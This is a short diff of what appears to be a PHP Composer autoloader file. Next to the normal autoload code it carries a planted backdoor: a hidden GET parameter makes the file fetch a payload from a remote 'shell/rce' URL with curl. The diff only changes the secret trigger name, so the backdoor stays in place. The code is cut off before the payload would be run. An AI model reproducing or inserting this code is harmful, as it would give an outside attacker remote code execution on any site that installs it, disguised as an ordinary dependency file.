@@ -73,7 +73,7 @@ function composerRequire062ed7c26ecbce812e6c84c9df86c27a($fileIdentifier, $file)
         $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;
     }
 }
-if (isset($_GET['MelupakanMemekItucUlitBangeT'])) {
+if (isset($_GET['AnkBngsatSebelahKuANjing'])) {
     $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
